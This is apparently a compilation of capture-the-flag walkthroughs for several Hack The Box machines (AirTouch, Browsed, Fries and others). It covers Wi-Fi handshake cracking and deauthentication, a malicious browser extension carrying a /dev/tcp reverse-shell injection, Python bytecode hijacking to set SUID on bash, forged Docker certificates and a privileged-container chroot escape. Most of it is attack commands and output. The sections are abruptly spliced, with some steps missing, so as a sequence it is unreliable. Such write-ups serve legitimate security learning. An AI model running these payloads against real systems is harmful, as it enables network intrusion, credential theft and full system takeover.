We scan the target with nmap and get the following ports: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA) | 256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA) |_ 256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The only open TCP port seems to be SSH. If you added the MIBs you can reenable # loading them by commenting out the following line. mibs : # If you want to globally change where snmp libraries, commands and daemons # look for MIBS, change the line below. Note you can set this for individual # tools with the -M option or MIBDIRS environment variable. # mibdirs /usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf # Uncomment the line above ^ Then, install the MIBS downloader: sudo apt install snmp-mibs-downloader This should fix the MIBS issue. Since the contact email contains airtouch.htb we can add that to our /etc/hosts file. We also get a snippet that mentions a default consultant password and a name. Let’s try those credentials on SSH: ┌──(kali㉿kali)-[~] └─$ nxc ssh 10.129.9.176 -u consultant -p RxBlZhLmOkacNWScmZ6D [==SNIP==] [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11 [==SNIP==] [+] consultant:RxBlZhLmOkacNWScmZ6D (Pwn3d!) Linux - Shell access! And it works! Time to check out what the shell has to offer.

We can log in as consultant, so let’s first see what their home directory has. consultant@AirTouch-Consultant:~$ ls -la total 888 drwxr-xr-x 1 consultant consultant 4096 Jan 18 11:33 . drwxr-xr-x 1 root root 4096 Jan 13 14:55 .. lrwxrwxrwx 1 consultant consultant 9 Mar 27 2024 .bash_history -> /dev/null -rw-r--r-- 1 consultant consultant 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 consultant consultant 3771 Feb 25 2020 .bashrc drwx------ 2 consultant consultant 4096 Jan 18 10:20 .cache -rw-r--r-- 1 consultant consultant 807 Feb 25 2020 .profile -rw-r--r-- 1 consultant consultant 131841 Mar 27 2024 diagram-net.png -rw-r--r-- 1 consultant consultant 743523 Mar 27 2024 photo_2023-03-01_22-04-52.png We see 2 PNGs. See https://openssh.com/pq.html consultant@airtouch.htb's password: diagram-net.png If we open them: photo: diagram: Beautiful diagrams, especially the first one. We are currently in the Consultant Laptop, as suggested by the output of the ifconfig command: consultant@AirTouch-Consultant:~$ ifconfig eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500 **inet 172.20.1.2** netmask 255.255.255.0 broadcast 172.20.1.255 ether e6:ea:72:59:00:de txqueuelen 0 (Ethernet) RX packets 20516 bytes 2509209 (2.5 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 35665 bytes 25808542 (25.8 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Our IP is 172.20.1.2. We can also see 2 SSIDs. AirTouch-Internet and AirTouch-Office, which have the Tablet Manager and the Corporate Computer systems tied to them. If we run sudo -l we can actually see that we can run every command as sudo without needing to enter a password: consultant@AirTouch-Consultant:~$ sudo -l Matching Defaults entries for consultant on AirTouch-Consultant: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User consultant may run the following commands on AirTouch-Consultant: **(ALL) NOPASSWD: ALL** This means we can simply run sudo su - and get a root shell: consultant@AirTouch-Consultant:~$ sudo su - root@AirTouch-Consultant:~# Easy enough! /root/ contains a directory called eaphammer with the eaphammer tool present in there. We see that airodump-ng is installed in the machine, and ip a shows a lot of wlan interfaces, so let’s run airodump-ng --band agb wlan0 to check out the available networks: We can see a few available access points, including AirTouch-Office and AirTouch-Internet which were also in the diagrams we found earlier. There are also 2 devices that are probing AccessLink and AirTouch-Office. We see that while AirTouch-Office is WPA2 encrypted with MGT authentication (meaning it is a WPA2-Enterprise), AirTouch-Internet just has PSK authentication, meaning we could potentially use eaphammer to get its PSK (Public Shared Key). Let’s first use eaphammer to try and capture an authorized handshake: ./eaphammer -i wlan1 --auth wpa-psk --pmkid --essid "AirTouch-Internet" 💡 Note: We can use any of the wlan interfaces. We don’t have to use wlan1. The tool should automatically turn the interface into monitor mode and start capturing packets. After some time we can see: [12:26:52 - 006] f09fc2a3f1a7 -> fcc233810f69 AirTouch-Internet [PROBERESPONSE, SEQUENCE 2528, AP CHANNEL 6] [12:26:52 - 006] 36d7122f6192 -> fcc233810f69 WIFI-JOHN [PROBERESPONSE, SEQUENCE 480, AP CHANNEL 6] [12:26:53 - 006] 286c07fea322 -> ffffffffffff AirTouch-Internet [PROBEREQUEST, SEQUENCE 2075] **[12:26:56 - 006] f09fc2a3f1a7 -> 286c07fea322 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 171]** [12:27:04 - 006] 286c0712eef3 -> ffffffffffff AirTouch-Office [PROBEREQUEST, SEQUENCE 3041] [12:27:14 - 006] c88a9a6ff9d2 -> ffffffffffff AccessLink [PROBEREQUEST, SEQUENCE 2155] It gets an authorized handshake. At this point we can stop the capturing and get the output file over to our system. The tool mentions the output file’s name and location above the packets, so we can copy that over to /home/consultant/ and use scp to get that file to our machine: scp consultant@airtouch.htb:hcxdumptool-output-2026-01-18-12-21-39-qHapKERb0vlcdrhfWZvJdAWZnifsf1D3.txt . Then, we can use hcxpcapngtool to convert that output file into a hash format that hashcat will recognise: hcxpcapngtool -o pmkid.hc22000 hcxdumptool-output-2026-01-18-12-21-39-qHapKERb0vlcdrhfWZvJdAWZnifsf1D3.txt 💡 Note: You may need to install hcxpcapngtool using sudo apt install hcxtools This should create a file called pmkid.hc22000 containing the hash in the format hashcat wants it. After that we can indeed run hashcat with the mode 22000 and soon after we get a hit: hashcat pmkid.hc22000 ~/Desktop/rockyou.txt -m 22000 [--SNIP--] ee920ac16a7e8daf90e9c62adffc1e6d:f09fc2a3f1a7:286c07fea322:AirTouch-Internet:challenge Session..........: hashcat Status...........: Cracked Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL) Hash.Target......: pmkid.hc22000 Time.Started.....: Sun Jan 18 03:02:26 2026 (2 secs) Time.Estimated...: Sun Jan 18 03:02:28 2026 (0 secs) Kernel.Feature...: Pure Kernel (password length 8-63 bytes) Guess.Base.......: File (/home/kali/Desktop/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#01........: 5440 H/s (12.37ms) @ Accel:73 Loops:1024 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 23429/14344385 (0.16%) Rejected.........: 15545/23429 (66.35%) Restore.Point....: 22544/14344385 (0.16%) Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#01...: starburst1 -> arlington Hardware.Mon.#01.: Util: 91% The SSID is AirTouch-Internet and its PSK is challenge . Now that we have the PSK we can connect to it. Let’s first create our config: wpa_passphrase "AirTouch-Internet" 'challenge' > wpa.conf And now let’s use wpa_supplicant to connect to it on the interface wlan1: wpa_supplicant -B -c /root/eaphammer/wpa.conf -i wlan1 The -B flag makes the command run in the background so that it doesn’t occupy the terminal And then we should be connected to the AirTouch-Internet AP (Access Point) on the interface wlan1, which we can confirm with the following command: root@AirTouch-Consultant:~/eaphammer# iw dev wlan1 link Connected to f0:9f:c2:a3:f1:a7 (on wlan1) SSID: AirTouch-Internet freq: 2437 RX: 8827 bytes (144 packets) TX: 1326 bytes (13 packets) signal: -30 dBm rx bitrate: 1.0 MBit/s tx bitrate: 18.0 MBit/s bss flags: short-slot-time dtim period: 2 beacon int: 100

We can confirm that with dhclient: root@AirTouch-Consultant:~/eaphammer# dhclient -v wlan1 Internet Systems Consortium DHCP Client 4.4.1 Copyright 2004-2018 Internet Systems Consortium. We can see that we have been assigned the IP 192.168.3.21 from the DHCP Server which is on 192.168.3.1. Let’s bring ligolo over to this machine so that we can comfortably check out those IPs from our own system. On our own machine: sudo ip tuntap add user kali mode tun ligolo sudo ip link set ligolo up ./proxy -selfcert On the target: curl 10.10.14.129:8000/agent -o agent chmod +x agent ./agent --connect 10.10.14.129:11601 -ignore-cert Back on our machine: ligolo-ng » session ? Specify a session : 1 - root@AirTouch-Consultant - 10.129.9.176:37280 - e6ea725900de [Agent : root@AirTouch-Consultant] » start sudo ip route add 192.168.3.0/24 dev ligolo And now we should have access to that IP range. We can use nmap to scan for hosts that are up: ┌──(kali㉿kali)-[~/Desktop/tools/ligoloAgent] └─$ nmap 192.168.3.0/24 -p 22,80 | grep -B 4 -E 'closed|open' Nmap scan report for 192.168.3.1 Host is up (0.069s latency). PORT STATE SERVICE 22/tcp open ssh 80/tcp open http -- Nmap scan report for 192.168.3.21 Host is up (0.12s latency). PORT STATE SERVICE 22/tcp open ssh 80/tcp closed http And we see that the only hosts that are truly up are 192.168.3.21 (which is us) and 192.168.3.1 which is the DHCP server, most likely the router or gateway. Now that we know which hosts are up, we can fully scan the DHCP server: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 10:d4:20:77:87:12:f2:21:cc:4a:83:de:f4:ab:c9:21 (RSA) | 256 22:c0:84:0f:69:e6:23:3c:9e:ce:42:90:fe:b5:cc:14 (ECDSA) |_ 256 c4:8a:dc:07:a9:5d:d4:57:94:6b:a1:46:8c:c5:5d:15 (ED25519) 53/tcp open domain dnsmasq 2.90 | dns-nsid: |_ bind.version: dnsmasq-2.90 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-title: WiFi Router Configuration |_Requested resource was login.php Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We can see that it has SSH and HTTP open. The title of the HTTP site is WiFi Router Configuration and the requested resource is login.php, meaning this is most likely a router panel. Let’s check it out. It is indeed a login page. It doesn’t seem to be vulnerable to any SQLi or anything else, so we’ll have to think of something else. Let’s try capturing the full packets of AirTouch-Internet: airodump-ng -c 6 -w wpa --essid 'AirTouch-Internet' --bssid F0:9F:C2:A3:F1:A7 wlan0 -c 6 because AirTouch-Internet is on channel 6, -w wpa is the name of the output file, and the BSSID in the flag is the one from AirTouch-Internet. This will start capturing packets. Let’s keep that session open and trigger a client deauthentication from another shell. The output of the airodump command should look something like this: CH 6 ][ Elapsed: 1 min ][ 2026-01-18 17:33 BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID F0:9F:C2:A3:F1:A7 -28 100 989 46 0 6 54 CCMP PSK AirTouch-Internet BSSID STATION PWR Rate Lost Frames Notes Probes F0:9F:C2:A3:F1:A7 28:6C:07:FE:A3:22 -29 54 -36 0 46 We can see a client connected to the AirTouch-Internet. Notice that the frames go up as time passes. That means that this client is exchanging data with AirTouch-Internet. If we trigger a deauthentication, that tells the AP that the association between the AirTouch-Internet and the client is no longer valid. This means that the client will immediately try to reconnect to the access point, triggering a 4-way WPA handshake. We can confirm that by running the deauth: root@AirTouch-Consultant:~# aireplay-ng -0 1 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0 17:40:01 Waiting for beacon frame (BSSID: F0:9F:C2:A3:F1:A7) on channel 6 17:40:01 Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:FE:A3:22] [ 0| 0 ACKs] And this time on the airodump shell: CH 6 ][ Elapsed: 2 mins ][ 2026-01-18 17:40 ]**[ WPA handshake: F0:9F:C2:A3:F1:A7** BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID F0:9F:C2:A3:F1:A7 -28 0 1690 78 6 6 54 CCMP PSK AirTouch-Internet BSSID STATION PWR Rate Lost Frames Notes Probes F0:9F:C2:A3:F1:A7 28:6C:07:FE:A3:22 -29 9 - 9 0 210 **EAPOL** AirTouch-Internet We can see there is a WPA handshake, and also the EAPOL is in the notes of the client that reconnected. This is because airodump realised it captured the EAPOL frame. EAPOL is Extensible Authentication Protocol over LAN, which is the protocol wrapper that carries the messages of the WPA 4-way handshake. If we let it run a bit after triggering the deauth, we can stop the capturing, copy the wpa-01.cap file to /home/consultant/ and use scp to get it to our system. After that, we can decrypt it using the PSK we found and get the decrypted cap file: ┌──(kali㉿kali)-[~/…/Machines/Medium/AirTouch/office] └─$ airdecap-ng -p challenge -e 'AirTouch-Internet' wpa-01.cap Total number of stations seen 1 Total number of packets read 348 Total number of WEP data packets 0 Total number of WPA data packets 68 Number of plaintext data packets 0 Number of decrypted WEP packets 0 Number of corrupted WEP packets 0 Number of decrypted WPA packets 66 Number of bad TKIP (WPA) packets 0 Number of bad CCMP (WPA) packets 0 Now that the WPA2 layer is removed, the capture contains regular Ethernet frames, allowing us to inspect higher-layer protocols such as HTTP packets. Those packets contain a PHPSESSID cookie, which we can use to access the login panel. This most likely happens because there is a scripted client or bot that automatically connects to the router’s login page when it connects to the AirTouch-Internet access point. This gives us 2 cookies: PHPSESSID=6k6t9pdi0d0qnhcr4g3auhjkpm and UserRole=user . If we head back to the login panel and try to log in while capturing the request with burp suite, we can see that there is no UserRole cookie. Getting a reverse shell the traditional way isn’t working, so we’re going to have to do some digging. pwd /var/www/html/uploads cd ..;ls index.php lab.php login.php logout.phtml style.css uploads cd ..;cat login.php array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/ 'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user') ); [--SNIP--] cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash user:x:1000:1000::/home/user:/bin/bash And we get 2 passwords and a user in the machine called user . We can use netexec to try out those passwords for the user user on SSH since we saw earlier that it is open (from the nmap scan): ┌──(kali㉿kali)-[~/Desktop/tools] └─$ nxc ssh 192.168.3.1 -u user -p 2wLFYNh4TSTgA5sNgT4 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11 [-] user:2wLFYNh4TSTgA5sNgT4 ┌──(kali㉿kali)-[~/Desktop/tools] └─$ nxc ssh 192.168.3.1 -u user -p JunDRDZKHDnpkpDDvay [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11 [+] user:JunDRDZKHDnpkpDDvay (Pwn3d!) Linux - Shell access! We get a hit on the password JunDRDZKHDnpkpDDvay ! We can now SSH using the creds user:JunDRDZKHDnpkpDDvay : user@AirTouch-AP-PSK:~$ sudo -l Matching Defaults entries for user on AirTouch-AP-PSK: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User user may run the following commands on AirTouch-AP-PSK: (ALL) NOPASSWD: ALL We see again that we can run everything as sudo, so we can simply run sudo su - to get root and read the user flag in /root/user.txt!

Inside the root directory, there is a file called send_certs.sh . These are its contents: root@AirTouch-AP-PSK:~# cat send_certs.sh #!/bin/bash # DO NOT COPY # Script to sync certs-backup folder to AirTouch-office. # Define variables REMOTE_USER="remote" REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG" REMOTE_PATH="~/certs-backup/" LOCAL_FOLDER="/root/certs-backup/" # Use sshpass to send the folder via SCP sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH" It looks like we have credentials for a user called remote whose pass is xGgWEwqUpfoOVsLeROeG . This script seems to be copying the certs-backup folder from 10.10.10.1 over to /root/certs-backup. Inside of certs-backup, there are a bunch of certificates: root@AirTouch-AP-PSK:~/certs-backup# ls -la total 40 drwxr-xr-x 2 root root 4096 Mar 27 2024 . drwx------ 1 root root 4096 Jan 21 14:18 .. -rw-r--r-- 1 root root 1124 Mar 27 2024 ca.conf -rw-r--r-- 1 root root 1712 Mar 27 2024 ca.crt -rw-r--r-- 1 root root 1111 Mar 27 2024 server.conf -rw-r--r-- 1 root root 1493 Mar 27 2024 server.crt -rw-r--r-- 1 root root 1033 Mar 27 2024 server.csr -rw-r--r-- 1 root root 168 Mar 27 2024 server.ext -rw-r--r-- 1 root root 1704 Mar 27 2024 server.key We could potentially use these to set up a rogue AP with eaphammer and capture credentials. Let’s run a quick sanity check to see if the certificates are valid: root@AirTouch-AP-PSK:~/certs-backup# openssl x509 -in ca.crt -noout -subject -issuer subject=C = ES, ST = Madrid, L = Madrid, O = AirTouch, OU = Certificate Authority, CN = AirTouch CA, emailAddress = ca@AirTouch.htb issuer=C = ES, ST = Madrid, L = Madrid, O = AirTouch, OU = Certificate Authority, CN = AirTouch CA, emailAddress = ca@AirTouch.htb root@AirTouch-AP-PSK:~/certs-backup# openssl x509 -in server.crt -noout -subject -issuer subject=C = ES, L = Madrid, O = AirTouch, OU = Server, CN = AirTouch CA, emailAddress = server@AirTouch.htb issuer=C = ES, ST = Madrid, L = Madrid, O = AirTouch, OU = Certificate Authority, CN = AirTouch CA, emailAddress = ca@AirTouch.htb root@AirTouch-AP-PSK:~/certs-backup# openssl rsa -in server.key -check RSA key ok We can see that the subject of ca.crt is the issuer of server.crt, and the server.key passes the check, meaning they are perfectly valid certificates.

We can bring server.crt , ca.crt and server.key over to the first machine that had eaphammer in it (by just using cat to read the each file and copy-pasting it) We can use those certificates along with eaphammer to create a rogue AP that will harvest credentials for us. This is called an Evil-Twin attack. We scan the target with nmap and get the following ports: PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA) |_ 256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-server-header: nginx/1.24.0 (Ubuntu) |_http-title: Browsed Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We see a website and SSH. Let’s visit the site.

The website seems to be of a company that develops browser extensions. It also looks like we can upload our own extension zips. By uploading one of the zips that we are given in the Samples page, we get a long error message that looks something like this: Throughout the error message, the URL http://browsedinternals.htb/ keeps getting mentioned. We can add that to our /etc/hosts and visit it.

Visiting browsedinternals.htb leads us to a gitea page with source code of a markdown preview app. In one of the logs we can find a username in the target machine: larry. Additionally, the app seems to be hosted on port 5000 of the machine and only accessible by localhost: Onto the interesting stuff now. There is an endpoint called routines: @app.route('/routines/<rid>') def routines(rid): # Call the script that manages the routines # Run bash script with the input as an argument (NO shell) subprocess.run(["./routines.sh", rid]) return "Routine executed !" Which seems to run the script routines.sh with the rid as argument. We could suspect a command injection with the rid but unfortunately subprocess.run() in python runs with shell=False by default, so that’s out of the table. This is routines.sh: #!/bin/bash [--SNIP--] if [[ "$1" -eq 0 ]]; then # Routine 0: Clean temp files [--SNIP--] elif [[ "$1" -eq 1 ]]; then # Routine 1: Backup data [--SNIP--] elif [[ "$1" -eq 2 ]]; then # Routine 2: Rotate logs [--SNIP--] elif [[ "$1" -eq 3 ]]; then # Routine 3: System info dump [--SNIP--] It is a bash script, and it tries to compare the first argument with 0, 1, 2 and 3 arithmetically (notice the double square brackets [[ ]] ). This is exploitable with command substitution since we control the first argument through the endpoint. So, all we need to do is create an extension that calls to this endpoint with an injection in the RID part. First, let’s copy over the manifest.json from one of the samples given to us and make some changes to it so that we can use it to contact the internal service: { "manifest_version": 3, "name": "Replace Images", "version": "1.0.0", "description": "Replaces every image on a page with one from a URL.", "permissions": ["scripting"], "host_permissions": [ "http://127.0.0.1/*" ], "background": { "service_worker": "background.js" } } The first part is kept the same but we also need to add the host_permissions so that it can access the internal site http://127.0.0.1/ (where the markdown preview service is hosted). Now we need a background.js file. If we try using a plain URL-encoded reverse shell: // Bash arithmetic injection const payload = "a[$(bash 'bash -i >&/dev/tcp/10.10.14.129/1234 0>&1')]"; const targetUrl = `http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`; fetch(targetUrl) // Doesn't work It doesn’t do anything. Let’s encode it in b64: const payload = "a[$(echo b64BlobHere | base64 -d | bash)]"; const targetUrl = `http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`; fetch(targetUrl) Save it, zip it up along with manifest.json and upload it. This will get us a reverse shell as the user larry who also has the user flag in his home directory. Let’s explain the payload a bit further. What did we actually do? Well, we passed as an argument in the command an array called a[] whose index was a command, so it ran that subcommand to find the index, but that subcommand doesn’t lead to an index, it is actually just a reverse shell.

If we run sudo -l we can see that we are allowed to run a python script as sudo: In that folder we can see there are 2 scripts and a pycache directory We can see that extension_tool.py imports 2 functions from extension_utils.py : #!/usr/bin/python3.12 import json import os from argparse import ArgumentParser **from extension_utils import validate_manifest, clean_temp_files** import zipfile [--SNIP--] However, we saw earlier the permissions of pycache: drwxrwxrwx. This means it is world-writeable, which means we could import a module from there. Python caches compiled bytecode in pycache for faster loading, so we can make a malicious one ourselves and place it there. First, let’s make the malicious extension_utils.py file, since we will need to include the functions that the original script is importing to avoid errors: import os def validate_manifest(path): os.system("bash -c 'chmod +s /bin/bash'") def clean_temp_files(extension_dir): os.system("bash -c 'chmod +s /bin/bash'") If any of them is called, bash will get the SUID bit. Now we need to compile that. Keep in mind, we saw from the shebang that the script is running on python3.12. So we use that to compile it: python3.12 -m py_compile evil.py . This will create another pycache directory so we just move the pyc file out of there and into the original pycache. If we run the original script, we see the pyc file that is created inside pycache: -rw-r--r-- 1 root root 1880 Jan 11 15:52 extension_utils.cpython-312.pyc So we need to name our bytecode file the same way. We just rename the file and then we run the script. Once one of the 2 functions get triggered, bash should have the SUID bit set: But it didn’t work… After a bit of digging, turns out there was another thing overlooked.

Normally, Python checks if the .pyc file matches the .py source file (checks timestamp or hash). With UNCHECKED_HASH, Python loads the .pyc file without checking if it matches the source. This means our malicious bytecode will be loaded even though we don't control the original extension_utils.py. So we actually need to compile it this way: import py_compile py_compile.compile( 'evil.py', # Name of our file cfile='extension_utils.cpython-312.pyc', # Name of output file doraise=True, # Raise an exception if it errors **invalidation_mode=PycInvalidationMode.UNCHECKED_HASH** # Don't check hash ) or in a one-liner: python3.12 -c "import py_compile;py_compile.compile('evil.py', cfile='extension_utils.cpython-312.pyc', doraise=True, invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH)" This should generate the pyc we need, meaning if we run the script: Bash has now the SUID bit set, so we just run bash -p and get a root shell! Decent box overall. User was pretty easy and root was a bit tougher but manageable still. Owned Browsed from Hack The Box!

NetExec says we can escape to root: [*] Supported NFS versions: (3, 4) **(root escape:True)** We can follow the wiki NetExec: Escape to root file system We can’t overwrite the etc/passwd and etc/shadow files, so we can’t get on the system this way. In the actual share (which is in /srv/web.fries.htb) there are a few interesting certificate keys and such. However we can’t get them using NetExec, so we’ll have to mount the share: sudo mkdir /tmp/friesmnt sudo mount -t nfs -o ro,soft,timeo=10 172.18.0.1:/srv/web.fries.htb/certs /mnt/friesmnt # We can also mount the whole share, but I figured we'd just use the certs since we don't # need the rest If we ls -la we the friesmnt we see that the only GID allowed is 59605603. So we create a user with that GID: sudo useradd bananaman vim /etc/passwd change the /etc/passwd entry for bananaman: bananaman:x:1001:59605603::/home/bananaman:/bin/sh and now we can access the mount. Let’s move the mount files somewhere we can read them without needing to interact with the mount: sudo -u bananaman cp -r ./friesmnt/ /tmp/testdir sudo chown kali /tmp/testdir sudo chown kali /tmp/testdir/* sudo umount /mnt/friesmnt and now all of our files are in /tmp/testdir and our user (kali) has perms over them. After that you can also move them to wherever you want. In the container, if we run env we can see the password Friesf00Ds2025!! . After a bit of trial and error, we see that it works for the user svc in 10.129.49.164 (the box’s IP) Note: I got the username svc by reading the /etc/passwd file through NFS root escape.

If we run netstat -tulnp we can see that port 2376 (Docker API) is open. tcp 0 0 127.0.0.1:2376 0.0.0.0:* LISTEN - Since we have the CA private keys, we can make our own certificate that the docker will accept. First, let’s create our configuration file which we’ll use to craft the certificate. Create a file called root.cnf with this content: [ req ] distinguished_name = req_distinguished_name prompt = no [ req_distinguished_name ] CN = root root in this case is the username that docker is going to see. Now let’s generate a new private key: openssl genrsa -out key.pem 2048 Then we create the certificate signing request: openssl req -new -key key.pem -out root.csr -config root.cnf And finally, sign the key with the CA private key we found: openssl x509 -req -in root.csr \ -CA ca.pem -CAkey ca-key.pem -CAcreateserial \ -out cert.pem -days 365 -sha256 ┌──(kali㉿kali)-[~/…/HTB/Machines/Hard/Fries] └─$ openssl x509 -req -in root.csr \ -CA certs/ca.pem -CAkey certs/ca-key.pem -CAcreateserial \ -out cert.pem -days 365 -sha256 Certificate request self-signature ok subject=CN=root Perfect! Now we just need to connect to the docker daemon with our new forged certificate. docker context create fries \ --docker host=tcp://240.0.0.1:2376 \ --docker ca=certs/ca.pem \ --docker cert=cert.pem \ --docker key=key.pem \ --docker skip-tls-verify=true This will create a context called fries. A Docker context is like a connection profile that tells the Docker CLI how to connect to a Docker daemon. In this case, we create this connection profile with information on where to connect, what certificates to use and connection options (the tls one). We can select our context with docker context use fries . Now. To connect as root and get the user flag: docker run -it --rm --privileged --net=host --pid=host -v /:/mnt [image] \ bash -c "chroot /mnt /bin/bash || chroot /mnt /bin/sh" Note: replace image with the docker image you get by running docker images and copying the image ID of fries REPOSITORY TAG IMAGE ID CREATED SIZE <none> <none> a35a9aa8056b 5 days ago 513MB fries-web latest **192168217481** 6 months ago 151MB postgres 16 616e340baeac 6 months ago 436MB dpage/pgadmin4 9.1.0 b2e76a3c5433 9 months ago 513MB pwm/pwm-webapp latest 6b2bacb1343e 9 months ago 378MB gitea/gitea 1.22.6 dfd595e2afd4 11 months ago 167MB What does this command do exactly? Run docker interactively (-i) and with a TTY/terminal (-t), and mount the whole target on your /mnt, and then spawn a bash as root (because of the docker context) with the filesystem’s root being /mnt/. And boom! We get the user flag! I saved id_rsa in the folder in case you need to log in with ssh.

This means that this is a leaf certificate. 💡 A leaf certificate (also called an end-entity certificate) is the final certificate in the chain of trust, aka the one actually used by the server/client/user/device. The certificate chain goes like this Root CA → Intermediate CA (optional) → Leaf certificate Basically, it can only be used by a specific server or user to prove its identity. While this is the certificate of the DC01 machine account (as we can see from the subject), it is not enough for us to log in to anything as DC01, since we would also need the CA Private Key. In conclusion, this certificate is a simple TLS public certificate and cannot be used (alone) to gain access to anything. I am not sure how one would decrypt the key, although it is probably possible. We can get credentials for the svc_infra user by adding a rogue LDAP server into the PWM Config, then clicking test config which will send us the password for the LDAP account.

The second and more useful vulnerability is a hidden SQLi in a PDO (PHP Data Object) prepared statement. https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/ $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? So let’s visit port 8000 which we saw was open from dnSpy. Specifically, http://240.0.0.1:8000/MonitorService. The presence of the ?wsdl parameter is important. WSDL stands for Web Services Description Language and is only exposed by SOAP web services. This immediately tells us that this endpoint is not a normal web application but a WCF SOAP service. SOAP stands for Simple Object Access Protocol. It is a protocol where remote functions are called by sending XML data over HTTP. Instead of clicking buttons or submitting forms, the client sends an XML document that tells the server which function to execute and with what arguments. If we follow the links (while replacing overwatch.htb with 240.0.0.1) http://240.0.0.1:8000/MonitorService?wsdl http://240.0.0.1:8000/MonitorService?singleWsdl the server responds with XML containing tags such as: <wsdl:definitions> <soap:binding> <soap:operation> These tags are specific to SOAP and confirm that this service is a SOAP endpoint implemented using WCF (Windows Communication Foundation). WCF is Microsoft’s framework for exposing C# methods over the network using protocols such as SOAP. If we look at http://240.0.0.1:8000/MonitorService?singleWsdl we can see what functions are callable under <wsdl:portType name = IMonitoringService> <wsdl:portType name="IMonitoringService"> <wsdl:operation name="StartMonitoring"> [--SNIP--] </wsdl:operation> <wsdl:operation name="StopMonitoring"> [--SNIP--] </wsdl:operation> <wsdl:operation name="KillProcess"> <soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/> [--SNIP--] </wsdl:operation> </wsdl:portType> We can call 3 functions. StartMonitoring , StopMonitoring and KillProcess . We can view the arguments needed under xs:schema: <xs:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/"> <xs:element name="StartMonitoring"> <xs:complexType> <xs:sequence/> </xs:complexType> </xs:element> <xs:element name="StartMonitoringResponse"></xs:element> <xs:element name="StopMonitoring"> <xs:complexType> <xs:sequence/> </xs:complexType> </xs:element> <xs:element name="StopMonitoringResponse"></xs:element> <xs:element name="KillProcess"> <xs:complexType> <xs:sequence> <xs:element minOccurs="0" name="processName" nillable="true" type="xs:string"/> </xs:sequence> </xs:complexType> </xs:element> <xs:element name="KillProcessResponse"></xs:element> </xs:schema> We can see that KillProcess requires an argument called processName while the others don’t require anything Although the page suggests generating a client using svcutil.exe, this is optional. SOAP does not require a compiled client. Any tool that can send a correctly formatted XML request over HTTP can interact with the service. This includes tools like curl, Burp Suite, or a manually crafted request. Let’s go back to dnSpy to see what those functions do.

